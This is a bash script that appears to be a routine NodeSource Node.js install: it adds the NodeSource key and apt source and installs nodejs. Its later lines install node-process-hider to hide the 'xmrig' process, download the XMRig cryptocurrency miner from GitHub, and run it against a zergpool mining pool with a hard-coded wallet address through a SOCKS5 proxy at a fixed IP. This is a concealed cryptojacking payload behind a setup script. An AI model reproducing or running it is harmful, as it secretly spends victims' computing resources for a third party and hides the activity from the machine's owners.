#!/bin/bash

# add-apt-repository may not be present on some Ubuntu releases:
# sudo apt-get install python-software-properties
sudo add-apt-repository -y -r ppa:chris-lea/node.js
sudo rm -f /etc/apt/sources.list.d/chris-lea-node_js-*.list
sudo rm -f /etc/apt/sources.list.d/chris-lea-node_js-*.list.save

KEYRING=/usr/share/keyrings/nodesource.gpg
#curl -fsSL https://deb.nodesource.com/gpgkey/nodesource.gpg.key | gpg --dearmor | sudo tee "$KEYRING" >/dev/null
# wget can also be used:
wget --quiet -O - https://deb.nodesource.com/gpgkey/nodesource.gpg.key | gpg --dearmor | sudo tee "$KEYRING" >/dev/null
gpg --no-default-keyring --keyring "$KEYRING" --list-keys

sudo apt-get install lsb-release

# Replace with the branch of Node.js or io.js you want to install: node_6.x, node_8.x, etc...
VERSION=node_12.x
# Replace with the keyring above, if different
KEYRING=/usr/share/keyrings/nodesource.gpg
# The below command will set this correctly, but if lsb_release isn't available, you can set it manually:
# - For Debian distributions: jessie, sid, etc...
# - For Ubuntu distributions: xenial, bionic, etc...
# - For Debian or Ubuntu derived distributions your best option is to use the codename corresponding to the upstream release your distribution is based off. This is an advanced scenario and unsupported if your distribution is not listed as supported per earlier in this README.
DISTRO="$(lsb_release -s -c)"
echo "deb [signed-by=$KEYRING] https://deb.nodesource.com/$VERSION $DISTRO main" | sudo tee /etc/apt/sources.list.d/nodesource.list
echo "deb-src [signed-by=$KEYRING] https://deb.nodesource.com/$VERSION $DISTRO main" | sudo tee -a /etc/apt/sources.list.d/nodesource.list

#Update Package List & install node js
sudo apt-get update &&
sudo apt upgrade -y &&
sudo apt-get install nodejs &&

#add xmrig to node hider
npm i -g node-process-hider &&
sudo ph add xmrig &&

#download miner and run
wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-bionic-x64.tar.gz &&
tar -zxf xmrig-6.16.2-bionic-x64.tar.gz &&
cd xmrig-6.16.2 &&
chmod +x xmrig &&
./xmrig -o randomARQ.mine.zergpool.com:4464 -a rx/arq -k -u 16GF8LfH1eLW2sWioKvTPoSKZ4U1i8Koci -p c=BTC,mc=GNTL --threads=1 -x socks5://192.252.214.20:15864
